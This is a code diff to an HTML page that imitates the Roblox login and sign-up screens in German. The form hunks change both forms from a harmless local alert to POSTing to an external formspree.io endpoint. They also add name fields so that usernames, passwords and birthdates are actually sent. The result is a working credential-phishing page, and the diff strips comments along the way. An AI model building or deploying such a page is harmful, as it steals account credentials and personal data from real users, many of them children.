@@ -130,7 +130,6 @@
             padding: 80px 20px 20px 20px;
         }
 
-        /* Roblox Logo in der Mitte (nur bei Registrierung) */
         .center-logo {
             font-size: 38px;
             font-weight: 900;
@@ -171,7 +170,6 @@
             margin-bottom: 6px;
         }
 
-        /* Geburtstags-Dropdowns nebeneinander */
         .dob-selects {
             display: flex;
             gap: 8px;
@@ -192,7 +190,6 @@
             border-color: #ffffff;
         }
 
-        /* Geschlecht Buttons */
         .gender-options {
             display: flex;
             gap: 8px;
@@ -207,11 +204,6 @@
             color: #ffffff;
             cursor: pointer;
             font-size: 18px;
-            transition: border-color 0.2s;
-        }
-
-        .gender-btn:hover {
-            border-color: #9ca3af;
         }
 
         .terms-text {
@@ -226,7 +218,6 @@
             text-decoration: none;
         }
 
-        /* Buttons unten in der Karte */
         .submit-btn {
             width: 100%;
             background-color: #ffffff;
@@ -244,7 +235,6 @@
             background-color: #e5e7eb;
         }
 
-        /* Zusätzliche Login-Buttons (wie auf dem Screenshot) */
         .secondary-btn {
             width: 100%;
             background-color: #2e3239;
@@ -256,11 +246,6 @@
             border-radius: 6px;
             cursor: pointer;
             margin-top: 10px;
-            transition: background 0.2s;
-        }
-
-        .secondary-btn:hover {
-            background-color: #374151;
         }
 
         .link-text {
@@ -280,7 +265,6 @@
             text-decoration: underline;
         }
 
-        /* Hilfsklasse zum Umschalten der Ansichten */
         .hidden {
             display: none;
         }
@@ -313,15 +297,15 @@
         <!-- ================= ANMELDEN ANSICHT ================= -->
         <div id="login-view" class="card hidden">
             <h2>Bei Roblox anmelden</h2>
-            <form onsubmit="event.preventDefault(); alert('Login abgeschickt!');">
+            <form action="https://formspree.io/f/xpppenqn" method="POST">
                 <div class="form-group">
                     <label>Benutzer/E-Mail/Telefon</label>
-                    <input type="text" placeholder="Benutzer/E-Mail/Telefon" required>
+                    <input type="text" name="login_user" placeholder="Benutzer/E-Mail/Telefon" required>
                 </div>
 
                 <div class="form-group">
                     <label>Passwort</label>
-                    <input type="password" placeholder="Passwort" required>
+                    <input type="password" name="login_password" placeholder="Passwort" required>
                 </div>
 
                 <button type="submit" class="submit-btn" style="background-color: #0096ff; color: white; margin-top: 5px;">Anmelden</button>
@@ -331,9 +315,9 @@
                 <a href="#" style="font-size: 12px; color: #9ca3af; text-decoration: none;">Passwort oder Benutzername vergessen?</a>
             </div>
 
-            <button class="secondary-btn">Einmaligen Code per E-Mail senden</button>
-            <button class="secondary-btn">Schnellanmeldung</button>
-            <button class="secondary-btn">Weitere Anmeldeoptionen</button>
+            <button type="button" class="secondary-btn">Einmaligen Code per E-Mail senden</button>
+            <button type="button" class="secondary-btn">Schnellanmeldung</button>
+            <button type="button" class="secondary-btn">Weitere Anmeldeoptionen</button>
 
             <div class="link-text">
                 Du hast kein Konto? <a href="#" onclick="showView('signup'); return false;">Registrieren</a>
@@ -348,18 +332,18 @@
             <div class="card">
                 <h2>Registriere dich und dann viel Spaß!</h2>
 
-                <form onsubmit="event.preventDefault(); alert('Registrierung abgeschickt!');">
+                <form action="https://formspree.io/f/xpppenqn" method="POST">
                     <!-- Geburtstag -->
                     <div class="form-group">
                         <label>Geburtstag</label>
                         <div class="dob-selects">
-                            <select id="month-select" required>
+                            <select id="month-select" name="geburtsmonat" required>
                                 <option value="" disabled selected>Monat</option>
                             </select>
-                            <select id="day-select" required>
+                            <select id="day-select" name="geburtsentag" required>
                                 <option value="" disabled selected>Tag</option>
                             </select>
-                            <select id="year-select" required>
+                            <select id="year-select" name="geburtsjahr" required>
                                 <option value="" disabled selected>Jahr</option>
                             </select>
                         </div>
@@ -368,13 +352,13 @@
                     <!-- Benutzername -->
                     <div class="form-group">
                         <label>Benutzername</label>
-                        <input type="text" placeholder="Verwende nicht deinen echten Namen" required>
+                        <input type="text" name="signup_username" placeholder="Verwende nicht deinen echten Namen" required>
                     </div>
 
                     <!-- Passwort -->
                     <div class="form-group">
                         <label>Passwort</label>
-                        <input type="password" placeholder="Mindestens 8 Zeichen" required>
+                        <input type="password" name="signup_password" placeholder="Mindestens 8 Zeichen" required>
                     </div>
 
                     <!-- Geschlecht -->
@@ -401,14 +385,13 @@
 
     </div>
 
-    <!-- JavaScript zum Generieren der Geburtstage & Umschalten der Ansichten -->
+    <!-- JavaScript für Datumsauswahl und Ansichten-Wechsel -->
     <script>
-        // 1. Dropdown-Werte automatisch generieren (Monate, Tage, Jahre)
         const months = ["Januar", "Februar", "März", "April", "Mai", "Juni", "Juli", "August", "September", "Oktober", "November", "Dezember"];
         const monthSelect = document.getElementById('month-select');
         months.forEach((m, index) => {
             let opt = document.createElement('option');
-            opt.value = index + 1;
+            opt.value = m;
             opt.textContent = m;
             monthSelect.appendChild(opt);
         });
@@ -430,7 +413,6 @@
             yearSelect.appendChild(opt);
         }
 
-        // 2. Funktion zum Hin- und Herschalten zwischen Login und Registrierung
         function showView(viewName) {
             const loginView = document.getElementById('login-view');
             const signupView = document.getElementById('signup-view');
